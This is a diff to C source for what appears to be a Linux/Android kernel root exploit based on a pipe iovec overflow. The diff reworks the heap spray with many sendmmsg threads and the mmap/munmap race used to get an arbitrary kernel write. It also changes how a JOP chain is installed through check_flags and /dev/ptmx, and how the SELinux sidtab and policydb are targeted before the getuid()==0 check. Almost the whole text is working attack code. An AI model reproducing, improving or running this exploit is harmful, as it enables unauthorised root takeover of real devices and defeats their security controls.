@@ -23,16 +23,14 @@
 #define PIPESZ (4096 * 32)
 #define IOVECS (512)
 #define SENDTHREADS (1000)
-#define MMAP_START ((void*)0x40000000)
-#define MMAP_SIZE (0x1000)
-#define MMAP_BASE(i) (MMAP_START + (i) * MMAP_SIZE)
+#define MMAP_ADDR ((void*)0x40000000)
+#define MMAP_SIZE (PAGE_SIZE * 2)
 
 static volatile int kill_switch = 0;
 static volatile int stop_send = 0;
 static int pipefd[2];
 static struct iovec iovs[IOVECS];
-static struct iovec sendiovs[IOVECS];
-static unsigned long overflowcheck = MEMMAGIC;
+static volatile unsigned long overflowcheck = MEMMAGIC;
 
 static void* readpipe(void* param)
 {
@@ -108,14 +106,13 @@ static void* writemsg(void* param)
 		pthread_exit((void*)-1);
 	}
 
-	msg.msg_hdr.msg_iov = sendiovs;
+	msg.msg_hdr.msg_iov = iovs;
 	msg.msg_hdr.msg_iovlen = IOVECS;
-	msg.msg_hdr.msg_control = sendiovs;
+	msg.msg_hdr.msg_control = iovs;
 	msg.msg_hdr.msg_controllen = (IOVECS * sizeof(struct iovec));
 
 	while(!stop_send)
 	{
-		//sendmmsg(sockfd, &msg, 1, 0);
 		syscall(__NR_sendmmsg, sockfd, &msg, 1, 0);
 	}
 
@@ -130,16 +127,11 @@ static int heapspray(long* target)
 	pthread_t msgthreads[SENDTHREADS];
 
 	printf("    [+] Spraying kernel heap\n");
-	for(i = 0; i < IOVECS; i++)
-	{
-		sendiovs[i].iov_base = MMAP_START;
-		sendiovs[i].iov_len = MMAP_SIZE;
-	}
 
-	sendiovs[(IOVECS / 2) + 1].iov_base = &overflowcheck;
-	sendiovs[(IOVECS / 2) + 1].iov_len = sizeof(overflowcheck);
-	sendiovs[(IOVECS / 2) + 2].iov_base = target;
-	sendiovs[(IOVECS / 2) + 2].iov_len = sizeof(*target);
+	iovs[(IOVECS / 2) + 1].iov_base = (void*)&overflowcheck;
+	iovs[(IOVECS / 2) + 1].iov_len = sizeof(overflowcheck);
+	iovs[(IOVECS / 2) + 2].iov_base = target;
+	iovs[(IOVECS / 2) + 2].iov_len = sizeof(*target);
 
 	for(i = 0; i < SENDTHREADS; i++)
 	{
@@ -150,7 +142,7 @@ static int heapspray(long* target)
 		}
 	}
 
-	sleep(3);
+	sleep(2);
 	stop_send = 1;
 	for(i = 0; i < SENDTHREADS; i++)
 		pthread_join(msgthreads[i], &retval);
@@ -161,13 +153,11 @@ static int heapspray(long* target)
 
 static void* mapunmap(void* param)
 {
-	void* addr = MMAP_BASE(1);
-
 	(void)param; /* UNUSED */
 	while(!kill_switch)
 	{
-		munmap(addr, MMAP_SIZE);
-		if(mmap(addr, MMAP_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == (void*)-1)
+		munmap(MMAP_ADDR, MMAP_SIZE);
+		if(mmap(MMAP_ADDR, MMAP_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == (void*)-1)
 		{
 			perror("mmap() thread");
 			exit(2);
@@ -192,29 +182,23 @@ static int startmapunmap()
 
 static int initmappings()
 {
-	unsigned int i;
-
+	memset(iovs, 0, sizeof(iovs));
 	printf("[+] Allocating memory\n");
-	for(i = 0; i < IOVECS; i++)
+
+	if(mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == (void*)-1)
 	{
-		int* addr = MMAP_BASE(i);
-		if(mmap(addr, MMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == (void*)-1)
-		{
-			perror("mmap()");
-			return 1;
-		}
-
-		memset(addr, 0, MMAP_SIZE);
-
-		iovs[i].iov_base = addr;
-		//total should be more than one pipe buf len (4096 bytes)
-		iovs[i].iov_len = 32;
+		perror("mmap()");
+		return -ENOMEM;
 	}
 
+	//just any buffer that is always available
+	iovs[0].iov_base = &wbuf;
 	//how many bytes we can arbitrary write
 	iovs[0].iov_len = sizeof(long) * 2;
-	//make a total of 2 pipe bufs (8192 bytes)
-	iovs[1].iov_len = ((8192 - iovs[0].iov_len) - (((IOVECS / 2) - 1) * 32));
+
+	iovs[1].iov_base = MMAP_ADDR;
+	//we need more than one pipe buf so make a total of 2 pipe bufs (8192 bytes)
+	iovs[1].iov_len = ((PAGE_SIZE * 2) - iovs[0].iov_len);
 
 	return 0;
 }
@@ -281,7 +265,6 @@ static int write_at_address(void* target, unsigned long targetval)
 	if(startreadpipe())
 		return 1;
 
-	sleep(1);
 	while(1)
 	{
 		if(overflowcheck != MEMMAGIC)
@@ -336,18 +319,23 @@ int getroot(struct offsets* o)
 	int dev;
 	unsigned long fp;
 	struct thread_info* ti;
+	void* jopdata;
+
+	if((jopdata = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0)) == (void*)-1)
+		return -ENOMEM;
 
 	printf("[+] Installing JOP\n");
 	if(write_at_address(o->check_flags, (unsigned long)o->joploc))
-		return 1;
+		goto end2;
 
 	sidtab = o->sidtab;
 	policydb = o->policydb;
-	preparejop(MMAP_START, o->jopret);
+	preparejop(jopdata, o->jopret);
 	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
-		return 1;
+		goto end2;
 
-	fp = (unsigned)fcntl(dev, F_SETFL, MMAP_START);
+	//we only get the lower 32bit because the return of fcntl is int
+	fp = (unsigned)fcntl(dev, F_SETFL, jopdata);
 	fp += KERNEL_START;
 	ti = get_thread_info(fp);
 
@@ -373,6 +361,8 @@ int getroot(struct offsets* o)
 	ret = 0;
 end:
 	close(dev);
+end2:
+	munmap(jopdata, PAGE_SIZE);
 	return ret;
 }
 #endif
@@ -403,9 +393,6 @@ int main(int argc, char* argv[])
 
 	close(pipefd[0]);
 	close(pipefd[1]);
-
-	for(i = 0; i < IOVECS; i++)
-		munmap(MMAP_BASE(i), MMAP_SIZE);
 	
 	if(getuid() == 0)
 	{
